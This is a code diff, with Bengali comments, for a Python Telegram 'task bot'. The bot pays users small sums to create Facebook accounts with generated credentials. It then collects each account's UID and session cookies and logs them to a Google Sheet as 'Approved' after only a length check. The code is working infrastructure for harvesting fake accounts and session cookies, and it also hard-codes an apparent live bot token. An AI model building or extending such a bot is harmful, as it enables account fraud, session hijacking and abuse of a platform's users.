@@ -8,7 +8,6 @@ from telegram.ext import (
     ContextTypes,
     CallbackQueryHandler,
     MessageHandler,
-    ConversationHandler,
     filters,
 )
 import gspread
@@ -39,11 +38,11 @@ def save_to_sheet(task_category, data_row):
     except Exception as e:
         print(f"Sheet Save Error: {e}")
 
-# --- [STATES] ---
-WAITING_FOR_UID = 1
-WAITING_FOR_COOKIES = 2
-
+# ১. স্টার্ট কমান্ড ও মেইন মেনু
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # সব ডাটা ক্লিয়ার করে দেওয়া যাতে বট কখনো আটকে না থাকে
+    context.user_data.clear()
+    
     keyboard = [
         ["🚀 Start Work", "💰 Balance"],
         ["💸 Withdraw", "👥 Referrals"],
@@ -54,13 +53,46 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name
     await update.message.reply_text(f"Hello, {user_name}! 👋\n\nWelcome to the Task Bot. Choose an option below:", reply_markup=reply_markup)
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ২. সব ধরনের মেসেজ এবং বাটন ক্লিক হ্যান্ডল করার ফাংশন
+async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # যদি ইনলাইন বাটন ক্লিক করা হয়
+    if update.callback_query:
+        query = update.callback_query
+        await query.answer()
+        data = query.data
+        
+        if data == "fb_cookies_task":
+            rand_name = f"User_{random.randint(1000, 9999)}"
+            rand_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+            
+            # ইউজারের স্টেট সেভ রাখা
+            context.user_data['step'] = 'waiting_uid'
+            context.user_data['temp_name'] = rand_name
+            context.user_data['temp_pass'] = rand_pass
+            
+            text = (
+                f"📂 **Facebook Account (Cookies Only)**\n\n"
+                f"👤 **Name:** {rand_name}\n"
+                f"🔑 **Password:** {rand_pass}\n\n"
+                f"1️⃣ Create a Facebook account using these details.\n"
+                f"2️⃣ Send your account UID in chat right now."
+            )
+            keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_task")]]
+            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+            
+        elif data == "cancel_task":
+            context.user_data.clear()
+            await query.message.edit_text("❌ Task process cancelled. Click /start to go back to the menu.")
+        return
+
+    # যদি ইউজার টেক্সট লেখে বা পাঠায়
     text = update.message.text
     
     if text == "🚀 Start Work":
+        context.user_data.clear()
         keyboard = [
             [InlineKeyboardButton("📁 Create FB Account (Cookies Only)", callback_data="fb_cookies_task")],
-            [InlineKeyboardButton("❌ Cancel Process", callback_data="cancel")]
+            [InlineKeyboardButton("❌ Cancel Process", callback_data="cancel_task")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text("📌 Select a task category:", reply_markup=reply_markup)
@@ -70,96 +102,53 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     elif text == "💸 Withdraw":
         await update.message.reply_text("💳 Minimum withdraw is $1.00.\nPlease select your payment method (bKash/Nagad).")
-
-# ক্লিভ হ্যান্ডলার (টাস্ক শুরু করার জন্য)
-async def fb_task_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    rand_name = f"User_{random.randint(1000, 9999)}"
-    rand_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-    
-    context.user_data['temp_name'] = rand_name
-    context.user_data['temp_pass'] = rand_pass
-    
-    text = (
-        f"📂 **Facebook Account (Cookies Only)**\n\n"
-        f"👤 **Name:** {rand_name}\n"
-        f"🔑 **Password:** {rand_pass}\n\n"
-        f"1️⃣ Create a Facebook account using these details.\n"
-        f"2️⃣ Click the button below to provide your account UID."
-    )
-    keyboard = [
-        [InlineKeyboardButton("🆔 Submit UID ➡️", callback_data="submit_uid")],
-        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_conv")]
-    ]
-    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
-    return WAITING_FOR_UID
-
-async def receive_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_uid = update.message.text
-    context.user_data['submitted_uid'] = user_uid
-    
-    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_conv")]]
-    await update.message.reply_text("✅ UID Saved.\n\n🍪 Please paste the Facebook Cookies:\n(Formats accepted: Netscape, JSON, or String)", reply_markup=InlineKeyboardMarkup(keyboard))
-    return WAITING_FOR_COOKIES
-
-async def receive_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cookies_data = update.message.text
-    telegram_id = update.effective_user.id
-    username = update.effective_user.username or "No Username"
-    user_uid = context.user_data.get('submitted_uid', 'N/A')
-    
-    await update.message.reply_text("⏳ Checking Facebook cookies... Please wait.")
-    
-    if len(cookies_data) > 15:  
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        final_data = f"UID: {user_uid} | Cookies: {cookies_data}"
         
-        save_to_sheet("FB_Cookies", [timestamp, str(telegram_id), str(username), final_data, "Approved"])
-        
-        await update.message.reply_text("✅ Facebook Cookies Valid!\n🎉 Task completed successfully! Balance updated.")
     else:
-        await update.message.reply_text("❌ Facebook Cookies Invalid or Expired!\nThe bot rejected the cookies.")
+        # ইউজার যদি টাস্কের ভেতরে থাকে এবং UID বা Cookies পাঠায়
+        current_step = context.user_data.get('step')
         
-    return ConversationHandler.END
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.callback_query:
-        query = update.callback_query
-        await query.answer()
-        await query.message.edit_text("❌ Process cancelled.")
-    else:
-        await update.message.reply_text("❌ Process cancelled.")
-    return ConversationHandler.END
+        if current_step == 'waiting_uid':
+            user_uid = text
+            context.user_data['submitted_uid'] = user_uid
+            context.user_data['step'] = 'waiting_cookies'
+            
+            await update.message.reply_text("✅ UID Saved.\n\n🍪 Now please paste the Facebook Cookies:")
+            
+        elif current_step == 'waiting_cookies':
+            cookies_data = text
+            telegram_id = update.effective_user.id
+            username = update.effective_user.username or "No Username"
+            user_uid = context.user_data.get('submitted_uid', 'N/A')
+            
+            await update.message.reply_text("⏳ Checking Facebook cookies... Please wait.")
+            
+            if len(cookies_data) > 10:  
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                final_data = f"UID: {user_uid} | Cookies: {cookies_data}"
+                
+                # গুগল শিটে সেভ করা
+                save_to_sheet("FB_Cookies", [timestamp, str(telegram_id), str(username), final_data, "Approved"])
+                
+                await update.message.reply_text("✅ Facebook Cookies Valid!\n🎉 Task completed successfully! $0.050 added to your pending balance.")
+            else:
+                await update.message.reply_text("❌ Facebook Cookies Invalid or Expired!\nThe bot rejected the cookies.")
+                
+            # কাজ শেষে স্টেট ক্লিয়ার করে দেওয়া যাতে বট ফ্রী থাকে
+            context.user_data.clear()
+        else:
+            await update.message.reply_text("💡 Please use the menu buttons below or type /start to reset.")
 
 def main():
     TOKEN = "8980706201:AAHmK_q9vcStJiTbd-m1HGaDjbYhga3pfps"
     application = Application.builder().token(TOKEN).build()
     
-    # সুনির্দিষ্ট কনভার্সেশন হ্যান্ডলার যা কখনো আটকাবে না
-    conv_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(fb_task_start, pattern="^fb_cookies_task$")],
-        states={
-            WAITING_FOR_UID: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_uid),
-                CallbackQueryHandler(cancel, pattern="^cancel_conv$")
-            ],
-            WAITING_FOR_COOKIES: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cookies),
-                CallbackQueryHandler(cancel, pattern="^cancel_conv$")
-            ]
-        },
-        fallbacks=[CommandHandler("start", start), CallbackQueryHandler(cancel, pattern="^cancel_conv$")]
-    )
-    
+    # সাধারণ হ্যান্ডলার যা কখনো ফ্রিজ বা ব্লক হবে না
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(conv_handler)
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    application.add_handler(CallbackQueryHandler(handle_all_messages))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_messages))
     
-    print("Bot is running smoothly without freezing...")
+    print("Bot is running smoothly without conversation lock...")
     application.run_polling()
 
 if __name__ == "__main__":
     main()
-
